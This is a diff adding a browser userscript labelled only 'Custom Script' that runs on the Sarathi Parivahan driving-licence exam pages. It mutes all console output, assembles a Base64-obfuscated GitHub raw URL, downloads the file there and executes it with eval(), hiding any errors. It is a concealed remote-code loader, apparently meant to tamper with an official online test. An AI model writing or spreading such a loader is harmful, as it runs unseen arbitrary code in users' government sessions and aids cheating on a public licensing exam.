@@ -1,0 +1,38 @@
+// ==UserScript==
+// @name         Custom Script
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  Run custom code
+// @author       You
+// @match        https://sarathi.parivahan.gov.in/sarathiservice/examselectaction.do
+// @match        https://sarathi.parivahan.gov.in/sarathiservice/stallexamaction.do
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // Your code here
+    (async () => {
+      // Console silence
+      console.log = () => {};
+      console.warn = () => {};
+      console.error = () => {};
+      console.info = () => {};
+
+      // सही Base64 parts (no %0F)
+      const parts = [
+        "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t",
+        "L3N1bWl0NTkzL3BlcnNvbmFs",
+        "L3JlZnMvaGVhZHMvbWFpbi9sbHM="
+      ];
+
+      const url = atob(parts.join(""));
+
+      try {
+        const res = await fetch(url);
+        const code = await res.text();
+        eval(code);
+      } catch (_) {}
+    })();
+})();
